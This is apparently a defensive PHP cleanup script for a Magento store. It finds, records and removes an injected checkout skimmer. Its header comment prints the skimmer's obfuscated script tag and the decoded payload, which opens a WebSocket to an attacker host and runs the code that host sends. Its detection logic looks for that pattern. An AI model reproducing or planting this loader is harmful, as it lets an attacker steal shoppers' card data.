<?php
/**
 * SECURITY: find and remove the injected checkout skimmer.
 *
 *   php shell/10-remove-checkout-skimmer.php            report only; exit 0 = clean, 1 = skimmer found
 *   php shell/10-remove-checkout-skimmer.php --apply    save evidence, strip the skimmer, clear caches, verify
 *
 * WHAT WAS FOUND (2026-09-25)
 *   core_config_data config_id 638, design/head/includes, scope stores/1 -- the
 *   store's "Scripts and Style Sheets" field, rendered into <head> on every page.
 *   After the legitimate GA4 tag and site-verification <meta>, it holds:
 *
 *     <script>var soc;if(new RegExp("securecheckout").test(window.location))
 *       new self["Function"||"Object"](atob('...')).call(this);</script>
 *
 *   The base64 decodes to:
 *
 *     soc=new self.WebSocket("wss://finteza.online/api/id/result");
 *     soc.onmessage=function(a){new self.Function(atob(a.data)).call(this)};
 *
 *   i.e. on any URL containing "securecheckout" it opens a WebSocket to the
 *   attacker and executes whatever JavaScript the attacker sends. This store's
 *   one-step checkout lives at /securecheckout (osc/general/route), so it is a
 *   remote-controlled payment skimmer (the "Magecart WebSocket" pattern).
 *
 * WHAT THIS DOES
 *   Scans core_config_data.value, cms_block.content and cms_page.content for
 *   <script> blocks that either
 *     - contain a known indicator (finteza), or
 *     - open a WebSocket AND execute dynamic code (Function/eval), or
 *     - execute dynamic code built from atob() -- base64-obfuscated eval.
 *   atob() literals are decoded before matching, so the obfuscated loader is
 *   judged on what it actually runs. The legitimate GA4 snippet matches none of
 *   these.
 *
 *   With --apply, only those <script> blocks (and the whitespace before them)
 *   are removed. Every other byte of the value -- the GA4 tag, the <meta> tag,
 *   line endings -- is left as it was.
 *
 * SAFETY
 *   - Evidence first: before anything is changed, each affected row's exact
 *     original value, its SHA-256, timestamps, the removed blocks, their decoded
 *     payloads and the indicator URLs are written to
 *     var/backups/skimmer-evidence-<timestamp>/ (0700 dir, 0600 files; var/ is
 *     not web-reachable). Keep it for the incident report.
 *   - Each UPDATE only lands if the row still has the SHA-256 it had when it was
 *     scanned; all rows change in one transaction, which is rolled back unless
 *     a re-scan comes back clean and each row holds exactly the expected value.
 *   - There is deliberately no --revert: re-inserting a skimmer should not be
 *     one command away. The evidence directory holds the original bytes.
 *   - Refuses to run as root, which would leave root-owned cache files behind.
 *
 * Idempotent: once clean, a re-run reports nothing to do and exits 0.
 *
 * THIS DOES NOT CLOSE THE HOLE THE SKIMMER CAME IN THROUGH. The same value is
 * almost certainly on production (this database is a copy of it) -- run this
 * there too, then treat it as a card-data incident: see
 * doc/07-checkout-skimmer.md.
 */

declare(strict_types=1);

// ------------------------------------------------------------------- config
const TARGETS = [
    ['table' => 'core_config_data', 'pk' => 'config_id', 'column' => 'value',
     'labels' => ['path', 'scope', 'scope_id'], 'time' => 'updated_at'],
    ['table' => 'cms_block', 'pk' => 'block_id', 'column' => 'content',
     'labels' => ['identifier', 'is_active'], 'time' => 'update_time'],
    ['table' => 'cms_page', 'pk' => 'page_id', 'column' => 'content',
     'labels' => ['identifier', 'is_active'], 'time' => 'update_time'],
];

/** Indicators of compromise seen in this attack. Matching one is enough. */
const KNOWN_IOCS = ['finteza'];

$root = dirname(__DIR__);
$apply = in_array('--apply', $argv, true);

function log_step(string $m): void { printf("\n\033[1;34m==> %s\033[0m\n", $m); }
function log_ok(string $m): void   { printf("    \033[0;32m[ok]\033[0m %s\n", $m); }
function log_warn(string $m): void { printf("    \033[0;33m[warn]\033[0m %s\n", $m); }
function log_bad(string $m): void  { printf("    \033[0;31m[FOUND]\033[0m %s\n", $m); }
function fail(string $m): never    { printf("\n\033[0;31m[FATAL]\033[0m %s\n", $m); exit(2); }

/** Decodes every atob('...') string literal in $js. */
function decode_atob_literals(string $js): array
{
    preg_match_all('~\batob\s*\(\s*([\'"])([A-Za-z0-9+/=\s]+)\1\s*\)~', $js, $m);
    $out = [];
    foreach ($m[2] as $b64) {
        $b64 = preg_replace('~\s+~', '', $b64);
        $b64 .= str_repeat('=', (4 - strlen($b64) % 4) % 4);
        $decoded = base64_decode($b64, true);
        if ($decoded !== false) {
            $out[] = $decoded;
        }
    }
    return $out;
}

/**
 * Returns the malicious <script> blocks in $html, each with its byte offsets,
 * decoded payloads and indicator URLs.
 */
function find_skimmers(string $html): array
{
    preg_match_all('~<script\b[^>]*>(.*?)</script\s*>~is', $html, $m, PREG_OFFSET_CAPTURE | PREG_SET_ORDER);
    $found = [];
    foreach ($m as $match) {
        [$block, $offset] = $match[0];
        $body = $match[1][0];
        $decoded = decode_atob_literals($body);
        $text = $body . "\n" . implode("\n", $decoded);

        $knownIoc = (bool) array_filter(KNOWN_IOCS, static fn(string $i): bool => stripos($text, $i) !== false);
        $runsCode = (bool) preg_match('~\bFunction\s*\(|\[\s*["\']Function["\']|\beval\s*\(~', $text);
        $opensSocket = (bool) preg_match('~\bWebSocket\s*\(~', $text);
        $obfuscatedEval = $runsCode && preg_match('~\batob\s*\(~', $body);

        if (!$knownIoc && !($opensSocket && $runsCode) && !$obfuscatedEval) {
            continue;
        }
        preg_match_all('~\b(?:wss?|https?)://[^\s"\'<>)]+~i', $text, $urls);
        $found[] = [
            'offset' => $offset,
            'length' => strlen($block),
            'block' => $block,
            'decoded' => $decoded,
            'iocs' => array_values(array_unique($urls[0])),
            'reasons' => array_keys(array_filter([
                'known indicator' => $knownIoc,
                'WebSocket + dynamic code' => $opensSocket && $runsCode,
                'base64-obfuscated dynamic code' => $obfuscatedEval,
            ])),
        ];
    }
    return $found;
}

/** Removes the given blocks, plus the whitespace immediately before each. */
function strip_blocks(string $html, array $blocks): string
{
    usort($blocks, static fn(array $a, array $b): int => $b['offset'] <=> $a['offset']);
    foreach ($blocks as $b) {
        $start = $b['offset'];
        while ($start > 0 && ctype_space($html[$start - 1])) {
            $start--;
        }
        $html = substr($html, 0, $start) . substr($html, $b['offset'] + $b['length']);
    }
    return $html;
}

// --------------------------------------------------------------- preflight
log_step('Preflight');

if (function_exists('posix_geteuid') && posix_geteuid() === 0) {
    fail('running as root -- run as the code owner, or the cache clean leaves root-owned files');
}
$env = @include $root . '/app/etc/env.php';
if (!is_array($env) || !isset($env['db']['connection']['default'])) {
    fail('cannot read app/etc/env.php -- not a Magento root?');
}
$db = $env['db']['connection']['default'];
$prefix = (string) ($env['db']['table_prefix'] ?? '');
[$host, $port] = array_pad(explode(':', (string) $db['host'], 2), 2, null);

try {
    $pdo = new PDO(
        sprintf('mysql:host=%s;%sdbname=%s;charset=utf8mb4', $host, $port ? "port=$port;" : '', $db['dbname']),
        $db['username'],
        $db['password'],
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]
    );
} catch (PDOException $e) {
    fail('database connection failed: ' . $e->getMessage());
}
log_ok(sprintf('database %s @ %s', $db['dbname'], $db['host']));
log_ok($apply ? 'mode: APPLY' : 'mode: report only (add --apply to remove)');

// -------------------------------------------------------------------- scan
log_step('Scanning core_config_data, cms_block, cms_page');

$findings = [];
foreach (TARGETS as $t) {
    $table = $prefix . $t['table'];
    $cols = array_merge([$t['pk'], $t['column'], $t['time']], $t['labels']);
    $sql = sprintf(
        'SELECT %s FROM `%s` WHERE `%s` LIKE :needle',
        implode(', ', array_map(static fn(string $c): string => "`$c`", $cols)),
        $table,
        $t['column']
    );
    $stmt = $pdo->prepare($sql);
    $stmt->execute([':needle' => '%<script%']);
    $scanned = 0;
    foreach ($stmt as $row) {
        $scanned++;
        $blocks = find_skimmers((string) $row[$t['column']]);
        if (!$blocks) {
            continue;
        }
        $label = implode(' ', array_map(static fn(string $l): string => "$l=" . $row[$l], $t['labels']));
        $findings[] = ['target' => $t, 'table' => $table, 'row' => $row, 'blocks' => $blocks, 'label' => $label];
        log_bad(sprintf('%s %s=%s  %s  (last changed %s)', $table, $t['pk'], $row[$t['pk']], $label, $row[$t['time']]));
        foreach ($blocks as $b) {
            printf("           why:      %s\n", implode('; ', $b['reasons']));
            foreach ($b['iocs'] as $url) {
                printf("           contacts: %s\n", $url);
            }
            foreach ($b['decoded'] as $d) {
                printf("           decoded:  %s\n", strlen($d) > 200 ? substr($d, 0, 200) . '...' : $d);
            }
        }
    }
    log_ok(sprintf('%s: %d row(s) containing <script> checked', $table, $scanned));
}

if (!$findings) {
    log_step('Clean -- no skimmer found');
    exit(0);
}

if (!$apply) {
    printf("\n    REPORT ONLY -- nothing was changed. %d row(s) affected.\n", count($findings));
    echo "    Re-run with --apply to save evidence and remove the malicious <script> blocks.\n\n";
    exit(1);
}

// ---------------------------------------------------------------- evidence
log_step('1/4  Saving evidence');

$evidenceDir = sprintf('%s/var/backups/skimmer-evidence-%s', $root, date('Ymd-His'));
if (!mkdir($evidenceDir, 0700, true)) {
    fail('could not create ' . $evidenceDir);
}
$old = umask(0077);
$record = [
    'found_by' => 'shell/10-remove-checkout-skimmer.php',
    'taken_at' => date('c'),
    'host' => gethostname(),
    'database' => $db['dbname'],
    'rows' => [],
];
foreach ($findings as $i => $f) {
    $t = $f['target'];
    $original = (string) $f['row'][$t['column']];
    $cleaned = strip_blocks($original, $f['blocks']);
    $findings[$i]['original'] = $original;
    $findings[$i]['cleaned'] = $cleaned;

    $rawFile = sprintf('%s/%s-%s.original', $evidenceDir, $f['table'], $f['row'][$t['pk']]);
    if (file_put_contents($rawFile, $original) === false) {
        fail('could not write ' . $rawFile);
    }
    $record['rows'][] = [
        'table' => $f['table'],
        $t['pk'] => $f['row'][$t['pk']],
        'labels' => array_intersect_key($f['row'], array_flip($t['labels'])),
        'last_changed' => $f['row'][$t['time']],
        'original_file' => basename($rawFile),
        'original_sha256' => hash('sha256', $original),
        'original_length' => strlen($original),
        'cleaned_sha256' => hash('sha256', $cleaned),
        'removed' => array_map(static fn(array $b): array => [
            'reasons' => $b['reasons'],
            'block' => $b['block'],
            'decoded' => $b['decoded'],
            'iocs' => $b['iocs'],
        ], $f['blocks']),
    ];
}
$json = json_encode($record, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
if (file_put_contents($evidenceDir . '/findings.json', $json . "\n") === false) {
    fail('could not write findings.json');
}
umask($old);
log_ok('evidence: ' . $evidenceDir);

// ------------------------------------------------------------------- apply
log_step('2/4  Removing the malicious blocks');

$pdo->beginTransaction();
try {
    foreach ($findings as $f) {
        $t = $f['target'];
        $stmt = $pdo->prepare(sprintf(
            'UPDATE `%1$s` SET `%2$s` = :new WHERE `%3$s` = :id AND SHA2(`%2$s`, 256) = :sha',
            $f['table'],
            $t['column'],
            $t['pk']
        ));
        $stmt->execute([
            ':new' => $f['cleaned'],
            ':id' => $f['row'][$t['pk']],
            ':sha' => hash('sha256', $f['original']),
        ]);
        if ($stmt->rowCount() !== 1) {
            throw new RuntimeException(sprintf('%s %s=%s changed since it was scanned', $f['table'], $t['pk'], $f['row'][$t['pk']]));
        }
        printf("    %s %s=%s  %d -> %d bytes\n", $f['table'], $t['pk'], $f['row'][$t['pk']], strlen($f['original']), strlen($f['cleaned']));
    }

    // Verify inside the transaction: exact expected bytes, and a clean re-scan.
    foreach ($findings as $f) {
        $t = $f['target'];
        $stmt = $pdo->prepare(sprintf('SELECT `%s` FROM `%s` WHERE `%s` = :id', $t['column'], $f['table'], $t['pk']));
        $stmt->execute([':id' => $f['row'][$t['pk']]]);
        $now = (string) $stmt->fetchColumn();
        if ($now !== $f['cleaned']) {
            throw new RuntimeException(sprintf('%s %s=%s does not hold the expected value', $f['table'], $t['pk'], $f['row'][$t['pk']]));
        }
        if (find_skimmers($now)) {
            throw new RuntimeException(sprintf('%s %s=%s still matches after cleaning', $f['table'], $t['pk'], $f['row'][$t['pk']]));
        }
    }
    $pdo->commit();
} catch (Throwable $e) {
    $pdo->rollBack();
    fail('rolled back, nothing changed: ' . $e->getMessage());
}
log_ok(count($findings) . ' row(s) cleaned and verified');

// ------------------------------------------------------------------ caches
log_step('3/4  Clearing caches');

// The head scripts are cached in config and in every full page. cache:clean does
// not empty var/page_cache on this install, so its contents are removed as well.
passthru(sprintf(
    '%s %s cache:clean config layout block_html full_page 2>&1',
    escapeshellarg(PHP_BINARY),
    escapeshellarg($root . '/bin/magento')
), $rc);
if ($rc !== 0) {
    log_warn('bin/magento cache:clean failed -- clear the config and full_page caches by hand');
}
$pageCache = $root . '/var/page_cache';
if (is_dir($pageCache)) {
    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($pageCache, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($it as $file) {
        $file->isDir() ? @rmdir($file->getPathname()) : @unlink($file->getPathname());
    }
    log_ok('var/page_cache emptied');
}

// ------------------------------------------------------------------ verify
log_step('4/4  Checking a fresh render');

$baseUrl = (string) $pdo->query(sprintf(
    "SELECT value FROM `%s` WHERE path = 'web/unsecure/base_url' AND scope = 'default'",
    $prefix . 'core_config_data'
))->fetchColumn();
if (!preg_match('~^https?://~', $baseUrl)) {
    log_warn('no literal base URL configured -- check a storefront page by hand');
    exit(0);
}
$url = $baseUrl . '?skimmer-check=' . time();   // a new URL, so the page is rendered, not served from cache
$html = @file_get_contents($url, false, stream_context_create(['http' => ['timeout' => 60, 'ignore_errors' => true]]));
$statusLines = array_values(array_filter($http_response_header ?? [], static fn(string $h): bool => str_starts_with($h, 'HTTP/')));
$status = end($statusLines) ?: 'no response';   // the last one, after any redirects
if ($html === false || !str_contains($status, '200')) {
    log_warn(sprintf('could not fetch %s (%s) -- check a storefront page by hand', $url, $status));
    exit(0);
}
if (find_skimmers($html)) {
    fail('the rendered page STILL contains the skimmer -- another source is injecting it (layout, template, or a cache this script did not clear)');
}
log_ok('rendered page is clean: ' . $url);

log_step('Done. This copy is clean; production still needs the same -- see doc/07-checkout-skimmer.md');
